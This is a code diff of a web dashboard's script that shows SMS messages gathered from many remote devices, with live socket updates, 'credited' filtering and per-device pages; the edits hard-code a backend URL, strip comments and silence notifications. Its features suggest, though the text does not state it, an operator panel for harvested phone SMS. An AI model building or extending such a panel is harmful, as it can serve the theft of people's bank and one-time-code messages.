@@ -1315,7 +1315,8 @@ body {
 </main>
 
 <script type="module">
-const API_BASE = import.meta.env.VITE_API_BASE;
+// Get API base from environment or use default
+const API_BASE = import.meta.env.VITE_API_BASE || "https://webback-production-c9c7.up.railway.app";
 
 const MESSAGES_API = `${API_BASE}/api/sms/all`;
 const VERIFY_TOKEN_API = `${API_BASE}/api/verify-token`;
@@ -1330,12 +1331,12 @@ let displayedMessages = [];
 let socket = null;
 let processedIds = new Set();
 let currentPage = 1;
-const PAGE_SIZE = 10; // Reduced for smoother loading
+const PAGE_SIZE = 10;
 let isLoading = false;
 let hasMoreMessages = true;
 
 // Network speed detection
-let networkSpeed = 'fast'; // 'slow', 'medium', 'fast'
+let networkSpeed = 'fast';
 let connectionType = '4g';
 let adaptiveBatchSize = 10;
 let adaptiveDelay = 0;
@@ -1344,13 +1345,15 @@ let adaptiveDelay = 0;
 let isNavigatingToDeviceDetails = false;
 let lastNavigationTime = 0;
 
+// Flag to track if we're using cache
+let usingCache = false;
+
 /* ===== NETWORK SPEED DETECTION ===== */
 function detectNetworkSpeed() {
   const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
   if (connection) {
-    const effectiveType = connection.effectiveType; // 'slow-2g', '2g', '3g', '4g'
-    const downlink = connection.downlink; // Mbps
-    const rtt = connection.rtt; // ms
+    const effectiveType = connection.effectiveType;
+    const downlink = connection.downlink;
     
     connectionType = effectiveType;
     
@@ -1368,7 +1371,6 @@ function detectNetworkSpeed() {
       adaptiveDelay = 0;
     }
     
-    // Update UI
     const speedIndicator = document.getElementById('networkSpeed');
     const speedText = document.getElementById('networkSpeedText');
     if (speedIndicator && speedText) {
@@ -1378,14 +1380,12 @@ function detectNetworkSpeed() {
     
     console.log(`📶 Network: ${effectiveType}, Speed: ${networkSpeed}, Batch: ${adaptiveBatchSize}, Delay: ${adaptiveDelay}ms`);
   } else {
-    // Default to fast if connection API not available
     networkSpeed = 'fast';
     adaptiveBatchSize = 15;
     adaptiveDelay = 0;
   }
 }
 
-// Listen for network changes
 if ('connection' in navigator) {
   const connection = navigator.connection;
   connection.addEventListener('change', detectNetworkSpeed);
@@ -1451,7 +1451,6 @@ function showSkeletonLoaders(count = adaptiveBatchSize) {
 async function adaptiveFetch(url, options = {}) {
   const startTime = Date.now();
   
-  // Add artificial delay for slow networks to simulate progressive loading
   if (adaptiveDelay > 0) {
     await new Promise(resolve => setTimeout(resolve, adaptiveDelay));
   }
@@ -1486,7 +1485,6 @@ function setupNavigation() {
                      window.location.pathname.includes('devices') ? 'devices' :
                      window.location.pathname.includes('setting') ? 'settings' : 'messages';
   
-  // Set active class based on current page
   navLinks.forEach(link => {
     const page = link.getAttribute('data-page');
     if (page === currentPage) {
@@ -1496,7 +1494,6 @@ function setupNavigation() {
     }
   });
   
-  // Add click event listeners
   navLinks.forEach(link => {
     link.addEventListener('click', function(e) {
       e.preventDefault();
@@ -1504,20 +1501,15 @@ function setupNavigation() {
       
       const page = this.getAttribute('data-page');
       
-      // Remove active class from all links
       navLinks.forEach(l => l.classList.remove('active'));
-      
-      // Add active class to clicked link
       this.classList.add('active');
       
-      // Navigate to the page
       navigateToPage(page);
     });
   });
 }
 
 function navigateToPage(page) {
-  // Save state before navigation
   saveCurrentState();
   
   switch(page) {
@@ -1540,7 +1532,6 @@ function navigateToPage(page) {
 
 /* ===== AUTHENTICATION FUNCTIONS ===== */
 function checkAuth() {
-  // Get token from localStorage
   authToken = localStorage.getItem('mr_robot_token');
   sessionId = localStorage.getItem('mr_robot_session_id');
   
@@ -1554,13 +1545,10 @@ function checkAuth() {
 }
 
 function redirectToLogin() {
-  // Clear any existing auth data
   localStorage.removeItem('mr_robot_token');
   localStorage.removeItem('mr_robot_session_id');
   localStorage.removeItem('mr_robot_userId');
   localStorage.removeItem('mr_robot_active_sessions');
-  
-  // Redirect to login page
   window.location.href = 'index.html';
 }
 
@@ -1594,13 +1582,11 @@ async function verifyTokenWithServer() {
     
   } catch (error) {
     console.error('❌ Token verification error:', error);
-    // Don't show error immediately on network issue
     return true;
   }
 }
 
 function showAuthError(message) {
-  // Show auth error message
   const authError = document.getElementById('authError');
   const authErrorBtn = document.getElementById('authErrorBtn');
   
@@ -1616,7 +1602,6 @@ function showAuthError(message) {
     authErrorBtn.onclick = redirectToLogin;
   }
   
-  // Hide main content
   document.querySelector('.main-content').style.display = 'none';
   document.querySelector('.nav').style.display = 'none';
   document.querySelector('.search-bar').style.display = 'none';
@@ -1625,7 +1610,6 @@ function showAuthError(message) {
 
 /* ===== STATE MANAGEMENT FUNCTIONS ===== */
 function saveCurrentState() {
-  // Don't save if we're navigating to device details
   if (isNavigatingToDeviceDetails) {
     console.log('🚀 Skipping state save - navigating to device details');
     return;
@@ -1640,7 +1624,6 @@ function saveCurrentState() {
     messagesCount: allMessages.length,
     displayedMessagesCount: displayedMessages.length,
     lastMessageId: allMessages.length > 0 ? allMessages[0]._id : null,
-    // Save ALL messages data (limited to prevent localStorage overflow)
     allMessages: allMessages.slice(0, 500),
     displayedMessages: displayedMessages.slice(0, 200),
     processedIds: Array.from(processedIds).slice(0, 1000)
@@ -1651,7 +1634,6 @@ function saveCurrentState() {
     console.log('💾 Messages page state saved with', state.allMessages.length, 'messages');
   } catch (e) {
     console.error('Error saving state:', e);
-    // If localStorage is full, save only essential data
     const essentialState = {
       searchQuery: state.searchQuery,
       filterValue: state.filterValue,
@@ -1669,7 +1651,6 @@ function loadSavedState() {
   try {
     const state = JSON.parse(savedState);
     
-    // Check if state is recent (within 30 minutes)
     if (state.saveTime && (Date.now() - state.saveTime < 30 * 60 * 1000)) {
       console.log('🔄 Found recent saved messages page state');
       return state;
@@ -1687,9 +1668,8 @@ function loadSavedState() {
 function restoreSavedState(state) {
   if (!state) return false;
   
-  console.log('🔄 Restoring COMPLETE saved state');
+  console.log('🔄 Restoring COMPLETE saved state silently');
   
-  // Restore all messages data if available
   if (state.allMessages && state.allMessages.length > 0) {
     allMessages = state.allMessages;
     console.log('📥 Restored', allMessages.length, 'messages from saved state');
@@ -1705,7 +1685,6 @@ function restoreSavedState(state) {
     console.log('📥 Restored', processedIds.size, 'processed IDs');
   }
   
-  // Restore UI state
   if (state.searchQuery) {
     document.getElementById("search").value = state.searchQuery;
   }
@@ -1718,7 +1697,6 @@ function restoreSavedState(state) {
     currentPage = parseInt(state.currentPage) || 1;
   }
   
-  // Restore scroll position
   if (state.scrollPosition) {
     setTimeout(() => {
       window.scrollTo(0, parseInt(state.scrollPosition));
@@ -1756,7 +1734,6 @@ function copyMessageToClipboard(text) {
         showToast("Failed to copy message");
       });
   } else {
-    // Fallback for older browsers
     const textArea = document.createElement("textarea");
     textArea.value = text;
     document.body.appendChild(textArea);
@@ -1777,7 +1754,6 @@ function initSocket() {
       reconnectionDelay: 1000
     };
     
-    // Add token to socket connection
     if (authToken) {
       socketOptions.auth = {
         token: authToken
@@ -1839,7 +1815,6 @@ function handleNewSMS(data) {
   const deviceId = data.uid || smsData.uniqueid || smsData.deviceId || smsData.uid;
   const smsId = data.smsId || smsData.id || smsData._id || `live_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
   
-  // Skip if already processed
   if (processedIds.has(smsId)) {
     console.log('⏭️ Already processed this SMS:', smsId);
     return;
@@ -1871,32 +1846,22 @@ function handleNewSMS(data) {
   
   console.log('📝 New LIVE SMS added:', newMsg);
   
-  // Add to beginning of all messages
   allMessages.unshift(newMsg);
-  
-  // Save to localStorage for persistence
   saveMessagesToStorage();
   
-  // Apply current filters and add to displayed messages
   if (filterMessage(newMsg)) {
     displayedMessages.unshift(newMsg);
-    
-    // Re-render the page
     renderCurrentPage();
     updatePaginationInfo();
   }
   
-  // Update total count
   updateTotalCount();
-  
-  // Show notification
   showNewMessageAlert(newMsg);
 }
 
 /* ===== LOCALSTORAGE FUNCTIONS ===== */
 function saveMessagesToStorage() {
   try {
-    // Save only recent messages to avoid localStorage limits (last 1000 messages)
     const messagesToSave = allMessages.slice(0, 1000);
     localStorage.setItem('cachedMessages', JSON.stringify(messagesToSave));
     console.log('💾 Messages saved to localStorage');
@@ -1911,16 +1876,11 @@ function loadMessagesFromStorage() {
     if (cachedMessages) {
       const parsedMessages = JSON.parse(cachedMessages);
       console.log('📂 Loaded messages from localStorage:', parsedMessages.length);
-      
-      // Add to allMessages
       allMessages = parsedMessages;
-      
-      // Restore processedIds
       parsedMessages.forEach(msg => {
         if (msg._id) processedIds.add(msg._id);
         if (msg.id) processedIds.add(msg.id);
       });
-      
       return true;
     }
   } catch (e) {
@@ -2022,7 +1982,6 @@ function filterMessage(msg) {
   const filter = document.getElementById("filter").value;
   const text = (msg.body || "").toLowerCase();
   
-  // Apply filter
   let filterPass = false;
   switch(filter) {
     case "credited":         
@@ -2043,7 +2002,6 @@ function filterMessage(msg) {
   
   if (!filterPass) return false;
   
-  // Apply search
   if (search) {
     const bodyText = msg.body || "";
     const senderText = msg.sender || "";
@@ -2065,14 +2023,11 @@ function applyFilters() {
   const searchQuery = document.getElementById("search").value.toLowerCase();
   const filterValue = document.getElementById("filter").value;
   
-  // Start timing
   const startTime = performance.now();
   
-  // Apply filters
   displayedMessages = allMessages.filter(msg => {
     const text = (msg.body || "").toLowerCase();
     
-    // Apply category filter
     let filterPass = true;
     switch(filterValue) {
       case "credited":         
@@ -2093,7 +2048,6 @@ function applyFilters() {
     
     if (!filterPass) return false;
     
-    // Apply search filter
     if (searchQuery) {
       const bodyText = msg.body || "";
       const senderText = msg.sender || "";
@@ -2109,13 +2063,8 @@ function applyFilters() {
     return true;
   });
   
-  // Reset to page 1 when applying filters
   currentPage = 1;
-  
-  // Render the page
   renderCurrentPage();
-  
-  // Save state
   saveCurrentState();
   
   const endTime = performance.now();
@@ -2130,7 +2079,6 @@ function renderCurrentPage() {
   
   if (!container) return;
   
-  // Calculate messages to show
   const endIndex = Math.min(currentPage * PAGE_SIZE, displayedMessages.length);
   const messagesToShow = displayedMessages.slice(0, endIndex);
   
@@ -2142,13 +2090,10 @@ function renderCurrentPage() {
     return;
   }
   
-  // Clear container efficiently
   container.innerHTML = '';
   
-  // Create document fragment for batch rendering
   const fragment = document.createDocumentFragment();
   
-  // Add messages to fragment
   messagesToShow.forEach(message => {
     const card = createMessageCard(message);
     if (card) {
@@ -2156,10 +2101,8 @@ function renderCurrentPage() {
     }
   });
   
-  // Append fragment to container (single reflow)
   container.appendChild(fragment);
   
-  // Update pagination
   if (paginationDiv) {
     paginationDiv.style.display = 'flex';
   }
@@ -2186,7 +2129,6 @@ function createMessageCard(message) {
   const deviceId = message.uniqueid || "N/A";
   const messageTimestamp = message.timestamp || Date.now();
   
-  // Calculate word and character counts
   const wordCount = messageBody.split(/\s+/).filter(word => word.length > 0).length;
   const charCount = messageBody.length;
 
@@ -2207,7 +2149,6 @@ function createMessageCard(message) {
       </div>
     </div>
     
-    <!-- Device info row -->
     <div class="device-info-row" data-device-id="${deviceId}" data-timestamp="${messageTimestamp}">
       <div class="device-info-item">
         <i class="fas fa-user-tag"></i>
@@ -2232,7 +2173,6 @@ function createMessageCard(message) {
       </div>
     </div>
     
-    <!-- Message body -->
     <div class="msg-body-container">
       <div class="msg-body-header">
         <span><i class="fas fa-message"></i> Message Content</span>
@@ -2245,7 +2185,6 @@ function createMessageCard(message) {
       </div>
     </div>
     
-    <!-- Footer -->
     <div class="message-footer">
       <div class="message-time">
         <i class="fas fa-clock"></i>
@@ -2264,18 +2203,15 @@ function createMessageCard(message) {
     </div>
   `;
 
-  // Message card click - toggle expand/collapse
   card.addEventListener('click', function(e) {
     if (e.target.closest('.device-info-row') || 
         e.target.closest('.message-body-display') || 
         e.target.closest('.copy-btn')) {
       return;
     }
-    
     this.classList.toggle('expanded');
   });
 
-  // Device info row click - navigate to device details
   const deviceInfoRow = card.querySelector('.device-info-row');
   if (deviceInfoRow) {
     deviceInfoRow.addEventListener('click', function(e) {
@@ -2286,21 +2222,14 @@ function createMessageCard(message) {
       
       if (deviceId && deviceId !== "N/A") {
         console.log(`🚀 Navigating to device details for device: ${deviceId}`);
-        
-        // Set flag that we're navigating to device details
         isNavigatingToDeviceDetails = true;
         lastNavigationTime = Date.now();
-        
-        // Save COMPLETE state before navigating
         saveCurrentState();
-        
-        // Navigate to device details
         window.location.href = `device-details.html?deviceId=${encodeURIComponent(deviceId)}&fromMessages=true`;
       }
     });
   }
 
-  // Copy button click - copy to clipboard
   const copyBtn = card.querySelector(".copy-btn");
   if (copyBtn) {
     copyBtn.addEventListener("click", function(e) {
@@ -2311,7 +2240,6 @@ function createMessageCard(message) {
     });
   }
 
-  // Message body click - copy to clipboard (alternative)
   const messageDisplay = card.querySelector(".message-body-display");
   if (messageDisplay) {
     messageDisplay.addEventListener("click", function(e) {
@@ -2361,7 +2289,6 @@ function loadMoreMessages() {
     console.log(`🔄 Loading more messages... Current page: ${currentPage}`);
   }
   
-  // Add network-based delay for smoother loading
   setTimeout(() => {
     currentPage++;
     
@@ -2373,7 +2300,6 @@ function loadMoreMessages() {
       
       console.log(`📥 Loading messages ${startIndex + 1} to ${endIndex} of ${displayedMessages.length}`);
       
-      // Use fragment for better performance
       const fragment = document.createDocumentFragment();
       messagesToShow.forEach(message => {
         const card = createMessageCard(message);
@@ -2410,7 +2336,7 @@ function updatePaginationInfo() {
     if (totalDisplayed === 0) {
       pageInfo.textContent = 'No messages found';
     } else {
-      pageInfo.textContent = `Showing ${currentShowing} of ${totalDisplayed} messages (${networkSpeed.toUpperCase()})`;
+      pageInfo.textContent = `Showing ${currentShowing} of ${totalDisplayed} messages`;
     }
   }
 }
@@ -2424,12 +2350,10 @@ function updateTotalCount() {
 
 /* ===== MESSAGE FETCHING FUNCTIONS ===== */
 async function fetchAllMessages(forceRefresh = false) {
-  // Check authentication first
   if (!checkAuth()) {
     return;
   }
   
-  // Verify token with server
   const tokenValid = await verifyTokenWithServer();
   if (!tokenValid) {
     return;
@@ -2438,42 +2362,31 @@ async function fetchAllMessages(forceRefresh = false) {
   const container = document.getElementById("messagesList");
   if (!container) return;
   
-  // Check for saved state
   const savedState = loadSavedState();
   
-  // If we have saved state and it's not a force refresh, restore it
+  // ✅ SILENT CACHE LOAD - No toast, no notification
   if (!forceRefresh && savedState && savedState.allMessages && savedState.allMessages.length > 0) {
-    console.log('🔄 Using saved state for fast load');
+    console.log('🔄 Using saved state for fast load (silent)');
+    usingCache = true;
     
-    // Restore saved state
     restoreSavedState(savedState);
-    
-    // Apply filters with restored data
     applyFilters();
-    
-    // Update total count
     updateTotalCount();
     
-    // Show toast for cached data
-    showToast(`Loaded ${allMessages.length} messages from cache`);
-    
-    // Fetch fresh data in background
+    // Fetch fresh data silently in background
     setTimeout(fetchFreshDataSilently, 1000);
     return;
   }
   
-  // Show skeleton loaders
   showSkeletonLoaders(adaptiveBatchSize);
   
   try {
-    // Fetch with Authorization header using adaptive fetch
     const response = await adaptiveFetch(MESSAGES_API, {
       headers: {
         'Authorization': `Bearer ${authToken}`
       }
     });
     
-    // Check for authentication errors
     if (response.status === 401 || response.status === 403) {
       showAuthError('Session expired. Please login again.');
       return;
@@ -2489,12 +2402,10 @@ async function fetchAllMessages(forceRefresh = false) {
     console.log(`📊 Total messages from API: ${data.data?.length || 0}`);
     
     if (data.success && data.data) {
-      // Process all messages from database
       data.data.forEach(msg => {
         if (msg._id) processedIds.add(msg._id);
         if (msg.id) processedIds.add(msg.id);
         
-        // Ensure all fields exist
         if (!msg.body) {
           if (msg.body_preview) msg.body = msg.body_preview;
           else if (msg.message) msg.body = msg.message;
@@ -2518,29 +2429,18 @@ async function fetchAllMessages(forceRefresh = false) {
         msg.isLive = false;
       });
       
-      // Sort messages by timestamp (newest first)
       allMessages = data.data.sort((a, b) => {
         const timeA = new Date(a.timestamp || a.createdAt || a.time || Date.now()).getTime();
         const timeB = new Date(b.timestamp || b.createdAt || b.time || Date.now()).getTime();
-        return timeB - timeA; // Newest first
+        return timeB - timeA;
       });
       
       console.log(`✅ Total messages loaded: ${allMessages.length}`);
       
-      // Save to localStorage
       saveMessagesToStorage();
-      
-      // Reset to page 1 when loading fresh data
       currentPage = 1;
-      
-      // Update total count
       updateTotalCount();
-      
-      // Apply filters and render
       applyFilters();
-      
-      // Show success toast
-      showToast(`Loaded ${allMessages.length} messages`);
       
     } else {
       console.log('⚠️ No data or success false:', data);
@@ -2551,7 +2451,6 @@ async function fetchAllMessages(forceRefresh = false) {
     
     updatePaginationInfo();
     
-    // Show pagination if needed
     const paginationDiv = document.getElementById("paginationContainer");
     const loadMoreBtn = document.getElementById('loadMoreBtn');
     
@@ -2568,17 +2467,16 @@ async function fetchAllMessages(forceRefresh = false) {
   } catch(error) {
     console.error('Fetch Error:', error);
     
-    // Check if it's an auth error
     if (error.message.includes('401') || error.message.includes('403')) {
       showAuthError('Authentication failed. Please login again.');
       return;
     }
     
-    // Try to use cached data if available
+    // ✅ SILENT CACHE FALLBACK - No toast
     if (loadMessagesFromStorage()) {
-      console.log('🔄 Using cached data due to fetch error');
+      console.log('🔄 Using cached data due to fetch error (silent)');
+      usingCache = true;
       applyFilters();
-      showToast('Using cached data (offline mode)');
       return;
     }
     
@@ -2611,7 +2509,6 @@ async function fetchFreshDataSilently() {
     if (response.ok) {
       const data = await response.json();
       if (data.success && data.data) {
-        // Process only NEW messages
         const newMessages = data.data.filter(msg => 
           !processedIds.has(msg._id) && !processedIds.has(msg.id)
         );
@@ -2619,12 +2516,10 @@ async function fetchFreshDataSilently() {
         if (newMessages.length > 0) {
           console.log(`🔄 ${newMessages.length} new messages fetched silently`);
           
-          // Process new messages
           newMessages.forEach(msg => {
             if (msg._id) processedIds.add(msg._id);
             if (msg.id) processedIds.add(msg.id);
             
-            // Normalize message data
             if (!msg.body) {
               if (msg.body_preview) msg.body = msg.body_preview;
               else if (msg.message) msg.body = msg.message;
@@ -2639,39 +2534,29 @@ async function fetchFreshDataSilently() {
             msg.isLive = false;
           });
           
-          // Add new messages to beginning
           allMessages = [...newMessages, ...allMessages].sort((a, b) => {
             const timeA = new Date(a.timestamp || a.createdAt || a.time || Date.now()).getTime();
             const timeB = new Date(b.timestamp || b.createdAt || b.time || Date.now()).getTime();
             return timeB - timeA;
           });
           
-          // Keep only last 1000 messages to prevent memory issues
           if (allMessages.length > 1000) {
             allMessages = allMessages.slice(0, 1000);
           }
           
-          // Save to localStorage
           saveMessagesToStorage();
           
-          // Update filtered messages if needed
           const currentSearch = document.getElementById("search").value.toLowerCase();
           const currentFilter = document.getElementById("filter").value;
           
           if (currentSearch || currentFilter !== "all") {
-            // Re-apply filters with new data
             applyFilters();
           } else {
-            // Just update displayed messages with new data
             displayedMessages = allMessages.slice();
             renderCurrentPage();
           }
           
-          // Update total count
           updateTotalCount();
-          
-          // Show subtle notification
-          showToast(`+${newMessages.length} new messages`);
         }
       }
     }
@@ -2685,7 +2570,6 @@ function clearFilters() {
   document.getElementById("search").value = "";
   document.getElementById("filter").value = "all";
   applyFilters();
-  showToast("Filters cleared!");
 }
 
 /* ===== REFRESH MESSAGES ===== */
@@ -2719,34 +2603,22 @@ document.addEventListener('visibilitychange', function() {
   if (document.visibilityState === 'visible') {
     console.log('👀 Page became visible - checking if we need to refresh');
     
-    // If we just navigated back from device details, restore state
     const urlParams = new URLSearchParams(window.location.search);
     const fromDeviceDetails = urlParams.get('fromDeviceDetails');
     
     if (fromDeviceDetails) {
       console.log('🔙 Returning from device details');
-      
-      // Clean the URL
       window.history.replaceState({}, document.title, window.location.pathname);
       
-      // Load saved state
       const savedState = loadSavedState();
       if (savedState) {
         console.log('🔄 Restoring state on return from device details');
         restoreSavedState(savedState);
-        
-        // Apply filters to update UI
         applyFilters();
-        
-        // Update total count
         updateTotalCount();
-        
-        // Show toast
-        showToast(`Restored ${allMessages.length} messages`);
       }
     }
     
-    // Refresh if it's been more than 5 minutes
     const lastState = loadSavedState();
     if (lastState && lastState.saveTime && (Date.now() - lastState.saveTime > 5 * 60 * 1000)) {
       console.log('🔄 Refreshing data after 5+ minutes of inactivity');
@@ -2755,24 +2627,19 @@ document.addEventListener('visibilitychange', function() {
   }
   
   if (document.visibilityState === 'hidden') {
-    // Save state when page is hidden
     saveCurrentState();
   }
 });
 
-// Handle beforeunload - save state unless going to device details
 window.addEventListener('beforeunload', function() {
-  // Only save state if we're not navigating to device details
   if (!isNavigatingToDeviceDetails) {
     saveCurrentState();
   }
 });
 
-// Handle popstate (back/forward navigation)
 window.addEventListener('popstate', function(event) {
   console.log('🔙 Back/forward navigation detected');
   
-  // Restore saved state
   const savedState = loadSavedState();
   if (savedState) {
     console.log('🔄 Restoring state from popstate event');
@@ -2781,7 +2648,6 @@ window.addEventListener('popstate', function(event) {
   }
 });
 
-// Prevent default form submission
 document.addEventListener('submit', function(e) {
   if (e.target.tagName === 'FORM') {
     e.preventDefault();
@@ -2792,61 +2658,44 @@ document.addEventListener('submit', function(e) {
 document.addEventListener('DOMContentLoaded', async function() {
   console.log('🚀 DOM Content Loaded - Initializing messages page');
   
-  // Detect network speed first
   detectNetworkSpeed();
-  
-  // Setup navigation first
   setupNavigation();
   
-  // Check authentication immediately
   if (!checkAuth()) {
     return;
   }
   
-  // Check if we're coming back from device details
   const urlParams = new URLSearchParams(window.location.search);
   const fromDeviceDetails = urlParams.get('fromDeviceDetails');
   const deviceId = urlParams.get('deviceId');
   
-  // Clean URL parameters if coming from device details
   if (fromDeviceDetails || deviceId) {
     window.history.replaceState({}, document.title, window.location.pathname);
   }
   
-  // Load saved state FIRST
   const savedState = loadSavedState();
   
-  // If we have saved state and it's recent, restore it IMMEDIATELY
+  // ✅ SILENT CACHE LOAD - No notification to user
   if (savedState && savedState.allMessages && savedState.allMessages.length > 0) {
-    console.log('🔄 RESTORING FULL STATE FROM CACHE');
+    console.log('🔄 RESTORING FULL STATE FROM CACHE (silent)');
+    usingCache = true;
     
-    // Restore all data from saved state
     restoreSavedState(savedState);
-    
-    // Update UI immediately
     updateTotalCount();
     renderCurrentPage();
     
-    // Show toast for cached data
-    showToast(`Using cached data (${allMessages.length} messages)`);
-    
-    // Fetch fresh data in background WITHOUT disturbing UI
+    // Fetch fresh data in background silently
     setTimeout(fetchFreshDataSilently, 1000);
     
   } else {
-    // No saved state, fetch fresh data with skeleton loaders
     console.log('🔄 No saved state found, fetching fresh data');
     showSkeletonLoaders(adaptiveBatchSize);
     await fetchAllMessages();
   }
   
-  // Setup event listeners
   setupEventListeners();
-  
-  // Initialize socket
   initSocket();
   
-  // Auto-save state every 30 seconds
   setInterval(saveCurrentState, 30000);
 });
 
@@ -2862,7 +2711,6 @@ window.clearMessageCache = function() {
     displayedMessages = [];
     processedIds.clear();
     renderCurrentPage();
-    showToast('Cache cleared!');
     setTimeout(() => window.location.reload(), 1000);
   }
 };
